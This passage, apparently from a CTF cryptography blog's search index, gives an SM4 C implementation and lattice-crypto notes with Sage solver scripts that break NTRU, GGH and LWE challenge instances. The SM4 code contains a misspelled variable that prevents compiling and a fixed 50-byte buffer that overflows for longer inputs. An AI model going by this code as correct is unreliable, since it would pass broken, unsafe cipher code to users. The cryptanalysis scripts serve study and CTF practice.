0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;;#endif//4字节无符号数组转无符号long型void four_uCh2uLong(u8* in, u32* out)&#123; int i = 0; *out = 0; for (i = 0; i &lt; 4; i++) *out = ((u32)in[i] &lt;&lt; (24 - i * 8)) ^ *out;&#125;//无符号long型转4字节无符号数组void uLong2four_uCh(u32 in, u8* out)&#123; int i = 0; //从32位unsigned long的高位开始取 for (i = 0; i &lt; 4; i++) *(out + i) = (u32)(in &gt;&gt; (24 - i * 8));&#125;//左移，保留丢弃位放置尾部u32 move(u32 data, int length)&#123; u32 result = 0; result = (data &lt;&lt; length) ^ (data &gt;&gt; (32 - length)); return result;&#125;//秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;u32 func_key(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23); return ulTmp;&#125;//加解密数据处理函数,先使用Sbox进行非线性变化，再进行线性变换Lu32 func_data(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24); return ulTmp;&#125;//加密函数（可以加密任意长度数据，16字节为一次循环，不足部分补0凑齐16字节的整数倍）//len:数据长度(任意长度数据) key:密钥（16字节） input:输入的原始数据 output:加密后输出数据void encode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u8* p = (u8*)malloc(50); //定义一个50字节缓存区 u32 ulKeyTmpList[4] = &#123; 0 &#125;; //存储密钥的u32数据 u32 ulKeyList[36] = &#123; 0 &#125;; //用于密钥扩展算法与系统参数FK运算后的结果存储 u32 ulDataList[36] = &#123; 0 &#125;; //用于存放加密数据 /***************************开始生成子秘钥********************************************/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32次循环迭代运算 &#123; //5-36为32个子秘钥 ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /***********************************生成32轮32位长子秘钥结束**********************************/ for (i = 0; i &lt; len; i++) //将输入数据存放在p缓存区 *(p + i) = *(input + i); for (i = 0; i &lt; 16 - len % 16; i++)//将不足16位补0凑齐16的整数倍 *(p + len + i) = 0; for (j = 0; j &lt; len / 16 + ((len % 16) ? 1 : 0); j++) //进行循环加密,并将加密后数据保存（可以看出此处是以16字节为一次加密，进行循环，即若16字节则进行一次，17字节补0至32字节后进行加密两次，以此类推） &#123; /*开始处理加密数据*/ four_uCh2uLong(p + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(p + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(p + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(p + 16 * j + 12, &amp;(ulDataList[3])); //加密 for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]); &#125; /*将加密后数据输出*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125; free(p);&#125;//解密函数（与加密函数基本一致，只是秘钥使用的顺序不同，即把钥匙反着用就是解密）//len:数据长度 key:密钥 input:输入的加密后数据 output:输出的解密后数据void decode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u32 ulKeyTmpList[4] = &#123; 0 &#125;;//存储密钥的u32数据 u32 ulKeyList[36] = &#123; 0 &#125;; //用于密钥扩展算法与系统参数FK运算后的结果存储 u32 ulDataList[36] = &#123; 0 &#125;; //用于存放加密数据 /*开始生成子秘钥*/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32次循环迭代运算 &#123; //5-36为32个子秘钥 ulKeyList[i + 4] = uKleyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /*生成32轮32位长子秘钥结束*/ for (j = 0; j &lt; len / 16; j++) //进行循环加密,并将加密后数据保存 &#123; /*开始处理解密数据*/ four_uCh2uLong(input + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(input + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(input + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(input + 16 * j + 12, &amp;(ulDataList[3])); //解密 for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i]);//与加密唯一不同的就是轮密钥的使用顺序 &#125; /*将解密后数据输出*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125;&#125;//无符号字符数组转16进制打印void print_hex(u8* data, int len)&#123; int i = 0; char alTmp[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27; &#125;; for (i = 0; i &lt; len; i++) &#123; printf(&quot;%c&quot;, alTmp[data[i] / 16]); printf(&quot;%c&quot;, alTmp[data[i] % 16]); putchar(&#x27; &#x27;); &#125; putchar(&#x27;\\n&#x27;);&#125;/*在主函数中实现任意字节加密与解密，并且结果正确*/int main(void)&#123; u8 i, len; u8 encode_Result[50] = &#123; 0 &#125;; //定义加密输出缓存区 u8 decode_Result[50] = &#123; 0 &#125;; //定义解密输出缓存区 u8 key[16] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10 &#125;; //定义16字节的密钥 //u8 Data_plain[18] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10,0x01,0x23 &#125;;//定义18字节的原始输入数据（测试用） //u8 Data_plain[32] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10,0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10 &#125;;//定义32字节的原始输入数据（测试用） u8 Data_plain[16] = &#123; 0x01,0x23,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;;//定义16字节的原始输入数据（测试用） len = 16 * (sizeof(Data_plain) / 16) + 16 * ((sizeof(Data_plain) % 16) ? 1 : 0);//得到扩充后的字节数（解密函数会用到） decode_fun(len, key, Data_plain, decode_Result); //数据解密 printf(&quot;解密后数据是：\\n&quot;); for (i = 0; i &lt; len; i++) printf(&quot;%x &quot;, *(decode_Result + i)); system(&quot;pause&quot;); return 0;&#125; ​ BlowfishBlowfish是一个对称加密块算法，由Bruce Schneider于1993年设计，现已应用在多种加密产品。Blowfish能保证很好的加密速度，并且目前为止没有发现有效地破解方法。目前为止AES比Blowfish有更广的知名度。 BlowFish参考：https://github.com/Rupan/blowfish/blob/master/blowfish.c","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"块密码","slug":"块密码","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"}],"author":"Lazzaro"},{"title":"格密码","slug":"crypto-格密码","date":"2020-11-07T03:53:05.000Z","updated":"2025-05-09T15:11:17.405Z","comments":true,"path":"2020/11/07/crypto-格密码/","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 格密码线性独立空间上有集合 $v_1,\\cdots,v_n \\in \\mathbb{R}^n$，格（Lattices）就是这些向量的线性组合，用公式表示为： $L=\\{a_1v_1+a_2v_2+\\cdots+a_nv_n \\mid a_1,a_2,\\cdots,a_n \\in \\mathbb{Z}\\}$。 格 $L$ 的维数等于格中向量的个数。 假定 $v_1,v_2,\\cdots,v_n$ 是格 $L$ 的基，$w_1,w_2,\\cdots,w_n \\in L$，则必然存在整系数 $a_{ij}$ 使得： $\\begin{cases} w_1=a_{11}v_1+a_{12}v_2+\\cdots+a_{1n}v_n \\\\ w_2=a_{21}v_1+a_{22}v_2+\\cdots+a_{2n}v_n \\\\ \\vdots \\\\ w_n=a_{n1}v_1+a_{n2}v_2+\\cdots+a_{nn}v_n \\end{cases}$ 这样，格的问题就是矩阵运算了。 最短向量问题（SVP，The Shortest Vector Problem）： 寻找一个格 $L$ 中最短的非零向量。即，寻找一个 $v \\in L$ 满足其欧几里德范数 $\\mid\\mid v \\mid\\mid$ 最小。 最接近向量问题（CVP，The Closest Vector Problem）： 对于一个非格 $L$ 中的向量 $w$，在格中寻找一个向量 $v$，使得 $\\mid\\mid w-v \\mid\\mid$ 最小。 CVP和SVP都是NP完备问题，因此求解起来十分困难，因此这两个问题都是可以作为密钥体制的基础的。 Hermite定理 这个定理揭示了格中最短向量的大概长度。 定理本体：对 $n$ 维的格 $L$，都包含一个非零向量 $v \\in L$，满足：$|v|\\leq \\sqrt n \\det (L) ^ {1/n}$。 $v$ 的长度是可以构造的，而上界是固定的，越接近上界，值越精确，故可以通过系数调整 $|v|$ 的值（配平）从而使得和上界更接近；但是存在问题，如果系数过大，使得长度超过了上界，则无法求解。 构造示例 $bm-kn-c=-r \\Longrightarrow \\begin{bmatrix} m &amp; -1 &amp; -k \\end{bmatrix}\\begin{bmatrix} 1 &amp; 0 &amp; b \\newline 0 &amp; 2^{400} &amp; c \\newline 0 &amp; 0 &amp; n \\end{bmatrix}=\\begin{bmatrix} m &amp; -2^{400} &amp; -r \\end{bmatrix}$ 使目标向量中的值数量级相近会更利于规约，对格进行配平（乘大系数T）后规约，有机会得到目标向量。 LLL加速：flatter 12345678910from subprocess import check_outputfrom re import findalldef flatter(M): # compile https://github.com/keeganryan/flatter and put it in $PATH z = &quot;[[&quot; + &quot;]\\n[&quot;.join(&quot; &quot;.join(map(str, row)) for row in M) + &quot;]]&quot; ret = check_output([&quot;flatter&quot;], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int, findall(b&quot;-?\\\\d+&quot;, ret)))L = flatter(M) 参考： 格攻击之小未知数方程求解入门——原理与例子 格基规约算法：算法详解 【CTF-Crypto】格密码基础 ​ NRTUNTRU是一个带有专利保护的开源公开密钥加密系统，使用基于格的加密算法来加密数据。它包括两部分算法：NTRUEncrypt用来加密，NTRUSign用来进行数字签名。与其他流行的公钥加密系统不同，它可以防止被Shor算法破解，并显著提升了性能。 在同等加密强度下，NTRU执行大开销的私钥操作比RSA算法快得多。RSA算法的私钥操作耗时与密钥长度呈三次方关系，而NTRU相应操作为二次方关系。 NTRU密码体制，需要三个整数参数 $(N,p,q)$ 和四个次数为 $N-1$ 的整系数多项式集合 $L_f,L_g,L_{\\varphi},L_m$，在这里 $N$ 为一素数，$p,q$ 可以不必为素数，但为安全，要求 $\\gcd(p,q)=1$，且 $q$ 远大于 $p$。 NTRU工作于多项式整数环 $\\mathbb{R}=\\mathbb{Z}[x]/(x^N-1)$，当 $F \\in \\mathbb{R}$，可以把 $F$ 表示为多项式或向量形式，$F=\\sum\\limits_{i=0}^{N-1}F_ix^i=[F_0,F_1,\\cdots,F_{N-1}]$。 在这里记 $L(d_1,d_2)=\\{F \\in \\mathbb{R}:F$ 有 $d_1$ 个系数为 $1$，$d_2$ 个系数为 $-1$，其余为 $0\\}$，选取三个确定的整数 $d_f,d_g,d_{\\varphi}$，多项式集合 $L_f=L(d_f,d_{f-1}),L_g=L(d_g,d_g),L_{\\varphi}=L(d_{\\varphi},d_{\\varphi})$，而 $L_m=\\{m \\in \\mathbb{R}:m$ 的系数位于区间 $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$，其中 $p$ 为素数 $\\}$。 密钥生成 B随机选择两个多项式 $f$ 和 $g$，$f\\in L_f,g\\in L_g$，要求 $f$ 关于模 $p$ 和模 $q$ 的逆 $F_p,F_q$ 都存在，也即 $F_q \\star f \\equiv 1 \\pmod q$ 和 $F_p \\star f \\equiv 1 \\pmod p$，这里可以用扩展欧几里得算法计算出 $F_p$ 和 $F_q$。为此， $f$ 首先应满足 $\\gcd(f(1),pq)=1$，如果有一个逆不存在，需重新选择 $f$。 然后，B计算 $h \\equiv F_q \\star g \\pmod q$，则公钥为 $h$，私钥为 $f$，但在实际中，还将存储 $F_p$，因而一般认为私钥为 $(f,F_p)$。 加密 假设A想发送信息 $m \\in L_m$ 给B，他将根据参数 $d_{\\varphi}$ 随机选择一个 $\\varphi \\in L_{\\varphi}$，然后，他利用B的公钥 $h$ 计算 $e \\equiv \\varphi \\star h+m \\pmod q$ A把密文 $e$ 发送给B。 解密 当B收到密文 $e$ 后，他首先利用私钥 $f$ 计算 $a \\equiv f \\star e \\pmod q$ 选择 $a$ 的系数位于 $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$ 之间，然后计算 $b \\equiv a \\pmod p$ $c \\equiv F_p \\star b \\pmod p$ 则多项式 $c$ 就是明文 $m$。 构造矩阵 $B^{NT}= \\left(\\begin {array}{c} I &amp; H \\newline 0 &amp; q \\end{array} \\right) =\\left(\\begin {array}{cccc|cccc} \\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\newline 0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; h_{N-2}\\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\newline \\hline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q\\end{array} \\right) $ 其中 $H$ 是根据公钥多项式的系数生成的循环矩阵。 构建一个这样的矩阵，然后进行LLL算法得到解密密钥。 参考 NTRU学习笔记 从一道CTF题初探NTRU格密码 Practical lattice-based cryptography: NTRUEncrypt and NTRUSign 1234567891011121314#Sageh = p = c = v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:])) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#Sage #多项式1N =p =q =Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]ex = hx = print(&#x27;-------decrypt------&#x27;)qq = x^N-1pp = y^N-1hn = [int(x) for x in hx.coefficients()]n = len(hn)A1 = matrix.identity(n)A0 = matrix.zero(n)Aq = matrix.identity(n) * qAh = matrix(ZZ, [hn[-i:] + hn[:-i] for i in range(n)])M = block_matrix([A1,Ah,A0,Aq],nrows=2)L = M.LLL()v = L[0]f = list(v)[:n]g = list(v)[n:]fx = Q(f)fy = P(f)gx = Q(g)Fqx = fx.inverse_mod(qq)Fpy = fy.inverse_mod(pp)#hxx = (Fqx*gx).mod(x^N-1)#print(hxx==hx)ax = (fx*ex).mod(qq)an = [int(x) for x in ax.coefficients()]#中心提升(centerlift)，使域范围从[0,q)变换到(-q/2,q/2)for i in range(len(an)): if an[i] &gt; q//2: an[i] -= qax = P(an)print(ax)out = (Fpy * ax).mod(pp)print(out)print(bytes(out.coefficients())) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748p = q = n = Zx.&lt;x&gt; = ZZ[]e = h = def inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))def mul(f,g): return (f * g) % (x^n-1)def bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g)def decrypt(e,pri_key): f,fp = pri_key a = bal_mod(mul(e,f),q) d = bal_mod(mul(a,fp),p) return ddef get_key(): for j in range(2 * n): try: f = Zx(list(M[j][:n])) fp = inv_mod_prime(f,p) return (f,fp) except: pass return (f,f)M = matrix(ZZ, 2*n, 2*n)hh = h.list()for i in range(n): M[i,i] = 1for i in range(n,2*n): M[i,i] = qfor i in range(n): for j in range(n): M[i,j+n] = hh[(n-i+j) % n]M = M.LLL()key = get_key()l = decrypt(e, key).list()flag = bytes(l)print(flag) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150# Sage# Ref: https://www.osgeo.cn/sagemath/constructions/rings.htmlclass NTRU: def __init__(self, N, p, q, d): self.debug = False assert q &gt; (6*d+1)*p assert is_prime(N) assert gcd(N, q) == 1 and gcd(p, q) == 1 self.N = N self.p = p self.q = q self.d = d self.R_ = PolynomialRing(ZZ,&#x27;x&#x27;) self.Rp_ = PolynomialRing(Zmod(p),&#x27;xp&#x27;) self.Rq_ = PolynomialRing(Zmod(q),&#x27;xq&#x27;) x = self.R_.gen() xp = self.Rp_.gen() xq = self.Rq_.gen() self.R = self.R_.quotient(x^N - 1, &#x27;y&#x27;) self.Rp = self.Rp_.quotient(xp^N - 1, &#x27;yp&#x27;) self.Rq = self.Rq_.quotient(xq^N - 1, &#x27;yq&#x27;) # order check in keyGen #self.RpOrder = self.p^self.N - self.p #self.RqOrder = self.q^self.N - self.q self.RpOrder = self.p^(self.N - 1) - 1 self.RqOrder = (self.q^self.N - self.q) // (self.q-1) self.sk, self.pk = self.keyGen() def test(self): assert self.debug == True pass def T(self, d1, d2): assert self.N &gt;= d1+d2 t = [1]*d1 + [-1]*d2 + [0]*(self.N-d1-d2) shuffle(t) return self.R(t) # center lift def lift(self, fx): mod = Integer(fx.base_ring()(-1)) + 1 # emmm return self.R([Integer(x)-mod if x &gt; mod//2 else x for x in list(fx)]) def keyGen(self): fx = self.T(self.d+1, self.d) gx = self.T(self.d, self.d) Fp = self.Rp(list(fx)) ^ (-1) # list emmm assert pow(self.Rp(list(fx)), self.RpOrder-1) == Fp # order checked assert self.Rp(list(fx)) * Fp == 1 # Fq = self.Rq(fx) ^ (-1) # wasted Fq = pow(self.Rq(list(fx)), self.RqOrder - 1) # invert assert self.Rq(list(fx)) * Fq == 1 # order checked hx = Fq * self.Rq(list(gx)) sk = (fx, gx, Fp, Fq, hx) pk = hx return sk, pk def setKey(self, fx, gx): assert type(fx) == type(&#x27;x^2 + 1&#x27;) # e.g. assert type(gx) == type(&#x27;x^2 - 1&#x27;) # emmm try: fx = self.R(fx) gx = self.R(gx) Fp = self.Rp(list(fx)) ^ (-1) Fq = pow(self.Rq(list(fx)), self.RqOrder - 1) hx = Fq * self.Rq(list(gx)) self.sk = (fx, gx, Fp, Fq, hx) self.pk = hx return True except: return False def getKey(self): ssk = ( str(self.R_(list(self.sk[0]))), # fx str(self.R_(list(self.sk[1]))) # gx ) spk = str(self.Rq_(list(self.pk))) # hx return ssk, spk def encrypt(self, m): assert type(m) == type(&#x27;x^2 + 1&#x27;) # e.g. assert self.pk != None hx = self.pk mx = self.R(m) mx = self.Rp(list(mx)) # change m to Rp, TODO: assert m in Rp mx = self.Rq(list(mx)) # change m to Rq rx = self.T(self.d, self.d) rx = self.Rq(list(rx)) e = self.p * rx * hx + mx #return e return str(self.Rq_(list(e))) def decrypt(self, e): assert type(e) == type(&#x27;xq^2 - 1&#x27;) # e.g. assert self.sk != None fx, gx, Fp, Fq, hx = self.sk e = self.Rq(e) ax = self.Rq(list(fx)) * e a = self.lift(ax) # center lift bx = Fp * self.Rp(list(a)) b = self.lift(bx) #return bx return str(self.R_(list(b))) if __name__ == &#x27;__main__&#x27;: mm = &#x27;-x^2 + x + 1&#x27; ntru = NTRU(N=11, p=3, q=512, d=3) #ntru.setKey(&#x27;xp^2+1&#x27;, &#x27;xq^2-1&#x27;) print(&#x27;keyGen check:&#x27;) sk, pk = ntru.getKey() print(&quot;fx = &#x27;%s&#x27;&quot; % sk[0]) print(&quot;gx = &#x27;%s&#x27;&quot; % sk[1]) print(&quot;hx = &#x27;%s&#x27;&quot; % pk) print(&#x27;\\nencrypt/decrypt check:&#x27;) e = ntru.encrypt(mm) print(&quot;e = &#x27;%s&#x27;&quot; % e) m = ntru.decrypt(e) print(m) assert m == mm print(m) print(&#x27;\\ncheck setKey:&#x27;) fx = &#x27;&#x27; gx = &#x27;&#x27; hx = &#x27;&#x27; e = &#x27;&#x27; ntru.setKey(fx, gx) m = ntru.decrypt(e) assert m == mm print(m) 参考： SCTF-XCTF 2020 - Lattice MAR DASCTF - threshold ​ GGH加密1997年，Goldreich、Goldwasser、Halevi三人受Ajtai在格难题上的研究所启发，提出了一个基于格中最近向量难题的非对称密码学算法：GGH Cryptosystem。 1999年，Nguyen发现在这个密码学算法设计中，有一个很大的缺陷，可以使攻击者从密文中获取到明文的部分信息，且可以将原来的最近向量难题转化为一个较为简单的最近向量难题。基于这个观察，Nguyen解出了设计者放在网上的5个challenge中的4个（其中有2个被设计者认为是不可能攻破的），足以证明该密码算法是broken的。 定义 GGH包含一个私钥和一个公钥，选取格 $L$ 的一组好基 $B$ 和一个幺模矩阵 $U$ 作为私钥，计算 $L$ 的另一组基 $B’=UB$ 作为公钥。 选定 $M$ 值，明文向量 $(m_1,m_2,\\cdots,m_n), \\quad m_i \\in(-M,M)$。 加密 给定明文 $m=(m_1,m_2,\\cdots,m_n)$，误差向量 $e$，和公钥 $B’$，计算 $v=m \\cdot B’=\\displaystyle\\sum m_ib_i’$； 密文 $c=v+e=m \\cdot B’+e$。 解密 计算 $c \\cdot B^{-1}=(m \\cdot B’+e)B^{-1}=m \\cdot U \\cdot B \\cdot B^{-1}+e \\cdot B^{-1}=m \\cdot U+e \\cdot B^{-1}$； 如果 $e \\cdot B^{-1}$ 足够小，可利用Babai最近平面算法的变种Babai rounding technique去除； 最后计算 $m=m \\cdot U \\cdot U^{-1} $ 得到明文。 GGH中的误差向量的选取是3或者-3。 求解 利用Nguyen’s Attack算法。 123456789101112131415161718192021222324252627# Sage # Read ciphertext and public key.c = []c = vector(ZZ, c)B = []B = matrix(ZZ, B)# Nguyen&#x27;s Attack.n = 150delta = 3s = vector(ZZ, [delta]*n)B6 = B.change_ring(Zmod(2*delta))left = (c + s).change_ring(Zmod(2*delta))m6 = (B6.solve_left(left)).change_ring(ZZ)new_c = (c - m6*B) * 2 / (2*delta)# embedded techniquenew_B = (B*2).stack(new_c).augment(vector(ZZ, [0]*n + [1]))new_B = new_B.change_ring(ZZ)new_B_BKZ = new_B.BKZ()shortest_vector = new_B_BKZ[0]mbar = (B*2).solve_left(new_c - shortest_vector[:-1])m = mbar * (2*delta) + m6print(bytes.fromhex(hex(m)[2:])) 12345678910111213# Sage# e=mW+rfrom sage.modules.free_module_integer import IntegerLatticeW = e = B = W.stack(e).augment(vector([0] * W.ncols() + [1]))r = IntegerLattice(B).shortest_vector()print(&#x27;r = &#123;&#125;&#x27;.format(r))m = W.solve_left(e - r[:-1])print(&#x27;m = &#123;&#125;&#x27;.format(m)) 参考 GGH encryption scheme GYCTF 2020 - GGH ​ LWE问题容错学习问题 （LWE问题， Learning With Errors）是一个机器学习领域中的怀疑难解问题，由Oded Regev 在2005年提出，他因此赢得2018年哥德尔奖。这是一个极性学习问题的一般形式。 定义 随机选取一个矩阵 $\\mathbf{A} \\in \\mathbb{Z}_q^{m \\times n}$，一个随机向量 $\\mathbf{s} \\in \\mathbb{Z}_q^n$，和一个随机的噪音 $\\mathbf{e} \\in \\varepsilon^m$。 一个LWE系统的输出 $g_\\mathbf{A}(\\mathbf{s, e}) = \\mathbf{As + e} \\pmod q$。 一个LWE问题是，给定一个矩阵 $\\mathbf{A}$，和LWE系统的输出 $g_\\mathbf{A}(\\mathbf{s, e})$，还原 $\\mathbf{s}$。 LWE的误差向量是一个满足正态分布的小向量。 因为加入了一些误差，如果使用高斯消元法的话，这些误差会聚集起来，使得解出来的东西跟实际值差很多。 求解 构造矩阵： $L = \\begin{bmatrix} I &amp; A \\newline 0 &amp; b \\end{bmatrix}$ 利用LLL算法和Babai最近平面算法，可以在多项式时间内找到SVP近似解。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#脚本1-小规模#Sagefrom sage.modules.free_module_integer import IntegerLatticerow = column = prime = ma = res = W = matrix(ZZ, ma)cc = vector(ZZ, res)# Babai&#x27;s Nearest Plane algorithmdef Babai_closest_vector(M, G, target): small = target for _ in range(5): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallA1 = matrix.identity(column)Ap = matrix.identity(row) * primeB = block_matrix([[Ap], [W]]) lattice = IntegerLattice(B, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, res)re = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(re))R = IntegerModRing(prime)M = Matrix(R, ma)M = M.transpose()ingredients = M.solve_right(re)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))m = &#x27;&#x27;for i in range(len(ingredients)): m += chr(ingredients[i])print(m) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#脚本2-大规模#Sagefrom sage.modules.free_module_integer import IntegerLatticefrom random import randintimport sysfrom itertools import starmapfrom operator import mul# Babai&#x27;s Nearest Plane algorithm# from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/def Babai_closest_vector(M, G, target): small = target for _ in range(1): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallm = n = q = A_values = b_values = A = matrix(ZZ, m + n, m)for i in range(m): A[i, i] = qfor x in range(m): for y in range(n): A[m + y, x] = 